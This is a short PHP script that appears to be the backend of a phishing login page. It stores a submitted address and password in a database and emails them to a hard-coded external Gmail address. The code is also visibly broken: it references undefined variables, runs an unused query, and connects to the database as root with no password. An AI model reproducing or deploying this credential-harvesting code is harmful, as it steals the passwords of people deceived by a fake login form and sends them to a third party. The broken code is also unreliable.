<?php 
    try {
        session_start();
        $bdd = new PDO('mysql:host=localhost;dbname=forum;charset=utf8;', 'root',  '');
    } catch (Exception $e) {

        die('Une erreur a ete trouvée : ' . $e->getMessage());
    }
    if(isset($_POST['submit'])){
        // Récupérer les données du formulaire
        $Adresse = $_POST['adresse'];
        $password = $_POST['password0'];
        
        //
        $verif=$bdd->prepare('SELECT adresse FROM face WHERE adresse = ?');
        $verif->execute(array($nom));		
        $insert = $bdd->prepare('INSERT INTO infos(adresse, password0) VALUES(?, ?)');
        $insert->execute(array($adresse, $password));

        // Adresse e-mail où envoyer le message
        $destinataire = "daniel.ryota123@gmail.com";
        
        // Sujet du message
        $sujet = "Nouveau message du formulaire de contact";
        
        // Construire le corps du message
        $corps_message = "Nom: $nom\n";
        $corps_message .= "Mot de passe: $email\n";
        
        // En-têtes du message
        $headers = "From: $email\r\n";
        $headers .= "Reply-To: $email\r\n";
        
        // Envoyer le message
        if(mail($destinataire, $sujet, $corps_message, $headers)){
            echo "Le message a été envoyé avec succès.";
        }else{
            echo "Une erreur s'est produite lors de l'envoi du message.";
        }
    }
